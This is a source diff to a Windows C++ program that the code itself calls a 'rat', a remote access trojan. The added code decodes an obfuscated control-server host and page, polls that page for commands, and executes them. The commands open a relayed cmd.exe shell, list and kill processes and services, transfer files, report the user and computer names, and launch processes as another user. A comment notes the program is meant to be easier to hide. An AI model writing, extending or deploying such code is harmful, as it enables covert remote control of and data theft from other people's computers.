@@ -25,7 +25,7 @@ using namespace std;
 #define COMMMAND_BUFFER (8192)
 
 
-int http_get(char *host, char *uri, char *headers)
+int http_get(char *host, char *uri, char *headers, char **data)
 {
 
 	HINTERNET hSession = InternetOpen(
@@ -121,6 +121,8 @@ int http_get(char *host, char *uri, char *headers)
 
 		break;
 	}
+
+	*data = buffer;
 
 	InternetCloseHandle(hHttpFile);
 	InternetCloseHandle(hConnect);
@@ -351,10 +353,9 @@ int upload_file(char *filename, char *host, char *uri)
 
 
 // start cmd.exe and issue some commands, will eventually be remotely controlled
-int start_shell()
+int start_shell(RedirectProcessIO *process)
 {
-	RedirectProcessIO process;
-	char buffer[COMMMAND_BUFFER] = { 0 };
+//	char buffer[COMMMAND_BUFFER] = { 0 };
 
 
 	char path[1024] = { 0 };
@@ -365,12 +366,14 @@ int start_shell()
 		strcat(path, "cmd.exe");
 	}
 
-	process.start(path);
+	process->start(path);
 
+	/*
 
 	memset(buffer, 0, COMMMAND_BUFFER);
-	process.read(buffer, COMMMAND_BUFFER);
+	process->read(buffer, COMMMAND_BUFFER);
 	printf("%s\n", buffer);
+
 	process.write("dir\n");
 
 	memset(buffer, 0, COMMMAND_BUFFER);
@@ -383,8 +386,8 @@ int start_shell()
 	process.read(buffer, COMMMAND_BUFFER);
 	printf("%s\n", buffer);
 
-
 	process.close();
+	*/
 
 	return 0;
 }
@@ -1263,27 +1266,31 @@ void create_process_nonblocking(char *cmdline)
 
 
 
-int whoami()
+int whoami(char *user, char *comp)
 {
 	char username[1024];
 	char compname[1024];
-	DWORD buffer_size = 1024;
+	DWORD username_size = 1024;
+	DWORD compname_size = 1024;
 
-	if (!GetComputerName(compname, &buffer_size))
+	if (!GetComputerName(compname, &username_size))
 	{
 		printf("GetComputerName failed\n");
 		return -1;
 	}
 
 
-	if (!GetUserName(username, &buffer_size))
+	if (!GetUserName(username, &compname_size))
 	{
 		printf("GetUserName failed\n");
 		return -1;
 	}
 
-	printf("User name:\t%s", username);
-	printf("Computer name:\t%s", compname);
+	printf("User name:\t%s\n", username);
+	printf("Computer name:\t%s\n", compname);
+
+	strcpy(user, username);
+	strcpy(comp, compname);
 
 	return 0;
 }
@@ -1778,45 +1785,196 @@ int list_volumes()
 }
 
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmdLine,        int       nShowCmd)
+int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *host, char *uri, char *url, char *path, char *start_cmdline)
 {
-	int command = 11;
+	if (strstr(cmdline, "shell") != 0)
+	{
+		cmd = 0;
+	}
+	else if (strstr(cmdline, "list") != 0)
+	{
+		cmd = 1;
 
-	int process = 0;
-	int pid = 9999;
-	char *url = "https://lineofsight.awright2009.com/roomy.zip";
-	char *path ="file.data";
+		if (strstr(cmdline, "/p") != 0)
+		{
+			process = 1;
+		}
+		else if (strstr(cmdline, "/s") != 0)
+		{
+			process = 0;
+		}
 
-	char *cmdline = "notepad.exe";
+	}
+	else if (strstr(cmdline, "kill") != 0)
+	{
+		cmd = 2;
 
-	RedirectIOToConsole(1);
+		if (strstr(cmdline, "/p") != 0)
+		{
+			process = 1;
+		}
+		else if (strstr(cmdline, "/s") != 0)
+		{
+			process = 0;
+		}
+	}
+	else if (strstr(cmdline, "getf") != 0)
+	{
+		cmd = 3;
+	}
+	else if (strstr(cmdline, "putf") != 0)
+	{
+		cmd = 4;
+	}
+	else if (strstr(cmdline, "kill") != 0)
+	{
+		cmd = 5;
 
-	switch (command)
+		if (strstr(cmdline, "/p") != 0)
+		{
+			process = 1;
+		}
+		else if (strstr(cmdline, "/s") != 0)
+		{
+			process = 0;
+		}
+	}
+	else if (strstr(cmdline, "whoami") != 0)
+	{
+		cmd = 6;
+	}
+	else if (strstr(cmdline, "quit") != 0)
+	{
+		cmd = 7;
+	}
+	else if (strstr(cmdline, "v") != 0)
+	{
+		cmd = 8;
+	}
+	else if (strstr(cmdline, "runpid") != 0)
+	{
+		cmd = 9;
+	}
+	else if (strstr(cmdline, "geturl") != 0)
+	{
+		cmd = 10;
+	}
+	else if (strstr(cmdline, "disk") != 0)
+	{
+		cmd = 11;
+	}
+
+
+	return 0;
+}
+
+
+RedirectProcessIO shell_process;
+
+
+int process_command(char *cmdline, char *headers)
+{
+	int cmd = -1;
+	int process = -1;
+	int pid = -1;
+
+	char host[4096] = { 0 };		// domain name, eg: www.awright2009.com
+	char uri[4096] = { 0 };			// get URI, eg: /index.html
+	char url[4096] = { 0 };			// full url for get_url eg: http://www.awright2009.com/roomy.zip
+	char path[4096] = { 0 };		// path used to save file for get url eg: "file.download"
+	char new_cmdline[4096] = { 0 }; // command line to send to create process eg: "C:\\Windows\\System32\\cmd.exe"
+
+	char user[4096] = { 0 };
+	char comp[4096] = { 0 };
+
+	static int shell_mode = 0;
+
+
+	char shell_buffer[8192] = { 0 };
+	int shell_length = 8192;
+
+	if (shell_mode)
+	{
+		int ret = 0;
+
+		memset(shell_buffer, 0, shell_length);
+		ret = shell_process.read(shell_buffer, shell_length);
+		printf("%s", shell_buffer);
+
+		ret = shell_process.write(cmdline);
+		if (ret != 0)
+		{
+			shell_mode = 0;
+			// try the command again just in case it wasn't targeted to the shell
+			process_command(cmdline, headers);
+			return 0;
+		}
+
+		memset(shell_buffer, 0, shell_length);
+		ret = shell_process.read(shell_buffer, shell_length);
+		printf("%s", shell_buffer);
+
+		if (ret != 0)
+		{
+			shell_mode = 0;
+			// try the command again just in case it wasn't targeted to the shell
+			process_command(cmdline, headers);
+			return 0;
+		}
+
+		// read one last time to check for broken pipes
+		memset(shell_buffer, 0, shell_length);
+		ret = shell_process.read(shell_buffer, shell_length);
+		printf("%s", shell_buffer);
+
+		if (ret != 0)
+		{
+			shell_mode = 0;
+			// try the command again just in case it wasn't targeted to the shell
+			return 0;
+		}
+
+
+		return 0;
+	}
+
+	// convert command line string into the various parameters for the commands
+	// for shell mode we'll have to pass the data straight through until the shell exits
+	int ret = parse_command(cmdline, cmd, process, pid, host, uri, url, path, new_cmdline);
+
+
+	switch (cmd)
 	{
 	case 0:
-		start_shell();
+		start_shell(&shell_process);
+
+		// let the shell start up
+		Sleep(5);
+		memset(shell_buffer, 0, shell_length);
+		ret = shell_process.read(shell_buffer, shell_length);
+		printf("%s", shell_buffer);
+
+		shell_mode = 1;
 		break;
 	case 1:
-		if (process)
-			list_process_or_service(true);
-		else
-			list_process_or_service(false);
+		list_process_or_service(process);
 		break;
 	case 2:
-		kill_process(pid, 0);
+		stop_process_or_service(process, new_cmdline, pid);
 		break;
 	case 3:
-//		getf();
-		http_get("www.awright2009.com", "/terminal.html", "User-Agent: Mozilla/5.0\r\n\r\n");
+	{
+		char *data = NULL;
+
+		http_get(host, uri, headers, &data);
 		break;
+	}
 	case 4:
 	{
 		char data[4096];
 		int length = 0;
 
-		http_put("www.awright2009.com", "/file.html", "User-Agent: Mozilla/5.0\r\n\r\n", data, length);
-//		putf();
-		//thread_get_put_file
+		http_put(host, uri, headers, data, length);
 		break;
 	}
 	case 5:
@@ -1826,11 +1984,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmd
 			start_service(cmdline);
 		break;
 	case 6:
-		whoami();
+		whoami(user, comp);
 		break;
 	case 7:
-
+		// quit
+		return -1;
 	case 8:
+		//20111117 and flush or something
+		break;
 	case 9:
 		StartProcessAsUser("c:\\Windows\\System32\\cmd.exe", 0, "awright");// start process as user
 		break;
@@ -1844,6 +2005,189 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmd
 		break;
 	case 12:
 		break;
+	}
+
+	return 0;
+}
+
+
+
+void decode(char *encoded, int length, char *decoded)
+{
+	for (int i = 0; i < length; i++)
+	{
+		decoded[i] = (encoded[i] >> 1) & 0x7F;
+	}
+}
+
+
+// www.awright2009.com
+char host_encoded[] = {
+	0xEE,
+	0xEE,
+	0xEE,
+	0x5C,
+	0xC2,
+	0xEE,
+	0xE4,
+	0xD2,
+	0xCE,
+	0xD0,
+	0xE8,
+	0x64,
+	0x60,
+	0x60,
+	0x72,
+	0x5C,
+	0xC6,
+	0xDE,
+	0xDA
+};
+
+// terminal.html
+char uri_encoded[] = {
+	0xE8,
+	0xCA,
+	0xE4,
+	0xDA,
+	0xD2,
+	0xDC,
+	0xC2,
+	0xD8,
+	0x5C,
+	0xD0,
+	0xE8,
+	0xDA,
+	0xD8
+};
+
+
+///=============================================================================
+/// Function: trim_characters
+///=============================================================================
+/// Description: trims characters for parsing lines in place
+///
+///
+/// Parameters:
+///		data	- string to trim
+///     length	-  length of string
+///     char_list - string of characters to remove
+///     list_length - length of above string
+///
+/// Returns:
+///		None
+///=============================================================================
+int trim_characters(char *data, int length, char *char_list, int list_length)
+{
+	int pos = 0;
+	for (int i = 0; i < length; i++)
+	{
+		char c = data[i];
+		int good = 1;
+
+		for (int j = 0; j < list_length; j++)
+		{
+			if (c == char_list[j])
+			{
+				good = 0;
+				break;
+			}
+		}
+
+		if (good == 0)
+		{
+			continue;
+		}
+
+		data[pos++] = c;
+	}
+	data[pos] = '\0';
+	return pos;
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmdLine,        int       nShowCmd)
+{
+	char user[4096] = { 0 };
+	char comp[4096] = { 0 };
+	char headers[4096] = { 0 };
+	char host[4096] = { 0 };
+	char uri[4096] = { 0 };
+	int exit = 0;
+
+	char *data = NULL;
+
+
+	// just open a console so we can printf, this is technically a windows app, I suppose so it's easier to hide?
+	RedirectIOToConsole(1);
+
+	whoami(user, comp);
+	sprintf(headers, "User-Agent: Mozilla/5.0\r\nAccept:*/*\r\nPragma:no-cache\r\nComputer: %s\r\n", comp);
+
+
+	decode(host_encoded, 19, host);
+	decode(uri_encoded, 13, uri);
+
+	while (1)
+	{
+		char cmdline[128][4096] = { 0 };
+		int num_cmd = 0;
+
+		http_get(host, uri, headers, &data);
+
+		if (strstr(data, "rat") != 0)
+		{
+			char *pdata = strstr(data, "rat");
+
+			while (1)
+			{
+				pdata = strstr(pdata, "\n");
+				if (pdata != NULL)
+				{
+					char *pdata_end = strstr(pdata + 1, "\n");
+					if (pdata_end == NULL)
+					{
+						break;
+					}
+
+					memcpy(cmdline[num_cmd++], pdata, pdata_end - pdata);
+					pdata += 2;
+
+					trim_characters(cmdline[num_cmd - 1], strlen(cmdline[num_cmd - 1]), "\r\n\t", 3);
+					strcat(cmdline[num_cmd - 1], "\n");
+
+					if (strstr(cmdline[num_cmd - 1], "</div>") != 0)
+					{
+						num_cmd--;
+						// reached ending div of container
+						break;
+					}
+
+
+				}
+				else
+				{
+					break;
+				}
+
+
+			}
+
+		}
+
+		for (int i = 0; i < num_cmd; i++)
+		{
+			printf("\nExecuting command [%d] %s\n", i, cmdline[i]);
+			if (process_command(cmdline[i], headers) == -1)
+			{
+				exit = 1;
+			}
+		}
+
+		if (exit)
+		{
+			break;
+		}
 	}
 
 	return 0;
